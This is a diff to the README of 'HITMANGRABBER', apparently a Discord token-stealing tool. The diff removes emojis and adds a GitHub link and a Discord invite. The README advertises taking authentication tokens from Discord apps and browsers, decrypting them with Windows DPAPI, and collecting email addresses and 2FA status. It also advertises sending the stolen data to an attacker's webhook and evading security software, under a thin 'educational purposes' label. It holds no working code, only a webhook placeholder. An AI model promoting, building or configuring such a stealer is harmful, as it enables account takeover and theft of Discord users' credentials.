@@ -1,16 +1,18 @@
 # HITMANGRABBER
 
-## 🚀 Overview
+## Overview
 Advanced Discord token extraction tool developed by **HITMAN** for security research and educational purposes. This tool scans multiple locations for Discord authentication tokens and sends detailed reports via Discord webhooks.
 
-## ✨ Features
+## Features
 * **Multi-Source Scanning**: Extracts tokens from Discord desktop applications and browsers
 * **Real-time Validation**: Verifies token validity through Discord API
 * **Encrypted Token Decryption**: Decrypts protected tokens using Windows DPAPI
 * **Rich Webhook Reports**: Sends formatted embeds with user avatars and detailed information
 * **Stealth Operation**: Designed to avoid detection by security software
 
-## 📁 Supported Sources
+## Supported Sources
+* GitHub: https://github.com/hitmanos/tokengrabber
+* Discord: https://discord.gg/CrAqFQkvHC
 
 ### Discord Applications
 * Discord
@@ -24,12 +26,12 @@ Advanced Discord token extraction tool developed by **HITMAN** for security rese
 * Brave Browser
 * Browser-based Discord clients
 
-## 🔑 Token Types Extracted
+## Token Types Extracted
 * Standard authentication tokens (24.6.27 format)
 * MFA-enabled tokens (mfa. format)
 * Encrypted local storage tokens (dQw4w9WgXcQ format)
 
-## 📊 Information Collected
+## Information Collected
 * Authentication tokens
 * Username and discriminator
 * Email address
@@ -38,7 +40,7 @@ Advanced Discord token extraction tool developed by **HITMAN** for security rese
 * Avatar/profile picture
 * 2FA status
 
-## ⚙️ Installation & Usage
+## Installation & Usage
 
 ### Prerequisites
 * Windows operating system
@@ -52,4 +54,4 @@ Advanced Discord token extraction tool developed by **HITMAN** for security rese
 
 ### Webhook Configuration
 ```python
-WEBHOOK_URL = "your_discord_webhook_url_here"
+WEBHOOK_URL = "your_discord_webhook_url_here"```
